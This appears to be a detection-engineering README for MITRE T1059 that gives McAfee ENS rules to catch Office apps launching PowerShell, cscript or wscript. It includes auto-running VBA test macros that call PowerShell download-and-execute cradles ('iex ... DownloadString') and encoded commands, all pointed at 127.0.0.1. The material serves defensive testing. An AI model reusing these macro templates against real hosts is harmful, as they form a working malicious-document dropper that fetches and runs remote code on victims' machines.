# T1059 - Command and String Interpreter

Malicious MS Office documents may attempt to launch PowerShell through embedded VBA code to execute PowerShell commands.  

**NOTES:**

- Each rule has been tested in a "clean" lab environment but will need to be tweaked for environmentental factors

- Tests include both the MS Office VBA code and a MS Office file for testing.  If you don't trust my files create a new MS Office file with the provided VBA code.

- McAfee ENS should fire a new alert for each test.  Some files include mulitple tests but will be separated by a MessageBox popup telling you what is being tested, along with an added timer pause during execution.

  

## 1. MS Office Launching PowerShell DownloadString / DownloadFile

**Description:**  VBA-enabled MS Office files are regularly leveraged to by adversaries to use PowerShell to download malicious code to execute the second stage of the attack.  

**MITRE ATT&CK Technique:** T1059.001

```jsx
Rule {
	Initiator {
		Match PROCESS {
			Include OBJECT_NAME {-v "winword.exe"}
			Include OBJECT_NAME {-v "excel.exe"}
			Include OBJECT_NAME {-v "powerpoint.exe"}
		}
	}
	Target {
		Match PROCESS {
			Include OBJECT_NAME {-v "powershell.exe"}
			Include PROCESS_CMD_LINE {-v "*DownloadString*"}
			Include PROCESS_CMD_LINE {-v "*DownloadFile*"}
			Include PROCESS_CMD_LINE {-v "*DownloadData*"}
			Include PROCESS_CMD_LINE {-v "*iwr*"}
		}
	}
}
```

**Trigger(s):**

1. MS Office application launched
2. MS Office application launches PowerShell process.
3. PowerShell attempts to download remote data.

## 2.  MS Office Launching Encoded PowerShell

**Description:**  VBA-enabled MS Office files may attempt to launch base64-encoded content by PowerShell to avoid AV detections and obscure intent.

**MITRE ATT&CK Technique:** T1059.001

```jsx
Rule {
	Initiator {
		Match PROCESS {
			Include OBJECT_NAME {-v "winword.exe"}
			Include OBJECT_NAME {-v "excel.exe"}
			Include OBJECT_NAME {-v "powerpoint.exe"}
		}
	}
	Target {
		Match PROCESS {
			Include OBJECT_NAME {-v "powershell.exe"}
			Include PROCESS_CMD_LINE {-v "*-e*"}
		}
	}
}
```

**Trigger(s):**

1. MS Office application launched
2. MS Office application launches PowerShell process.
3. PowerShell attempts to run encoded commands.



#### **TEST Files - Covers #1 and #2:**

[T1059.001-MS Word.docm](Test%20Files/T1059.001-MS_Word.docm)

[T1059.001-MS Excel.xlsm](Test%20Files/T1059.001-MS_Excel.xlsm)

**Test VBA Code:**

```jsx
Public Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal Milliseconds As LongPtr)

Public Sub AutoOpen()

    Dim objWshell1 As Object
    Set objWshell1 = CreateObject("WScript.Shell")
    Dim psString As String
    
    '1 - VBA Launching PowerShell DownloadString
    psString = "powershell.exe -ExecutionPolicy Bypass -nologo -Command iex (New-Object Net.WebClient).DownloadString('http://127.0.0.1/NOTHING');"
    MsgBox ("1 - VBA Launching PowerShell DownloadString" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.001" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)
    Sleep (3000)
    
    '2 - VBA Launching PowerShell DownloadFile
     psString = "powershell.exe -ExecutionPolicy Bypass -nologo -Command iex (New-Object Net.WebClient).DownloadFile('http://127.0.0.1/NOTHING');"
    MsgBox ("2 - VBA Launching PowerShell DownloadFile" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.001" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)
    Sleep (3000)
   
   '3 - VBA Launching PowerShell DownloadData
     psString = "powershell.exe -ExecutionPolicy Bypass -nologo -Command iex (New-Object Net.WebClient).DownloadData('http://127.0.0.1/NOTHING');"
    MsgBox ("3 - VBA Launching PowerShell DownloadData" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.001" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)
    Sleep (3000)
    
    '4 - VBA Launching PowerShell Invoke-WebRequest #1
     psString = "powershell.exe -ExecutionPolicy Bypass -nologo -Command iex (iwr -uri http://127.0.0.1 -outfile c:\\windows\\temp\\test);"
    MsgBox ("3 - VBA Launching PowerShell Invoke-WebRequest #1" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.001" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)
   
    Sleep (3000)
    '5 - VBA Launching PowerShell Invoke-WebRequest #2
   
    psString = "powershell.exe -ExecutionPolicy Bypass -nologo -Command iex (invoke-webrequest -uri http://127.0.0.1 -outfile c:\\windows\\temp\\test);"
    MsgBox ("3 - VBA Launching PowerShell Invoke-WebRequest #2" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.001" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)
    Sleep (3000)

    '6 - VBA Launching PowerShell Encoded Command
    psString = "powershell.exe -EncodedCommand ZQBjAGgAbwAgACIASABpACAAVABoAGUAcgBlACEAIgA="
    MsgBox ("3 - VBA Launching PowerShell Encoded Command" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.001" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)
    Sleep (5000)

End Sub
```

## 3. MS Office Launching Other Scripts

**Description:**  VBA-enabled MS Office files may attempt to launch JavaScript and VBScript.

**MITRE ATT&CK Technique:** T1059.005, T1059.007

```jsx
Rule {
	Initiator {
		Match PROCESS {
			Include OBJECT_NAME {-v "winword.exe"}
			Include OBJECT_NAME {-v "excel.exe"}
			Include OBJECT_NAME {-v "powerpoint.exe"}
		}
	}
	Target {
		Match PROCESS {
			Include -nt_access "CREATE"
			Include OBJECT_NAME {-v "cscript.exe"}
			Include OBJECT_NAME {-v "wscript.exe"}
		}
	}
}
```

**Trigger(s):**

1. MS Office application launched
2. MS Office application launches PowerShell process.
3. PowerShell attempts to run encoded commands.

**Test VBA Code:**

```jsx
Public Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal Milliseconds As LongPtr)
 
Public Sub AutoOpen()
    Dim objWshell1 As Object
    Set objWshell1 = CreateObject("WScript.Shell")
    Dim psString As String
    
    '1 - VBA Launching PowerShell EncodedCommand
    psString = "powershell.exe -EncodedCommand JABTAGUAcgB2AGUAcgAgAD0AIABSAGUAYQBkAC0ASABvAHMAdAAgAC0AUAByAG8AbQBwAHQAIAAnAEUAbgBjAG8AZABlAGQAIABjAG8AbQBtAGEAbgBkACAAcgB1AG4ALgAgACAAUAByAGUAcwBzACAARQBuAHQAZQByACcA"
    MsgBox ("1 - VBA Launching PowerShell EncodedCommand" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.007/009" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)
    MsgBox ("Complete.")
End Sub

```

#### TEST Files - Covers #3**

[T1059.007-T1059.009-MS_Excel.xlsm](Test%20Files/T1059.007-T1059.009-MS_Excel.xlsm)

[T1059.007-T1059.009-MS_Word.docm](Test%20Files/T1059.007-T1059.009-MS_Word.docm)

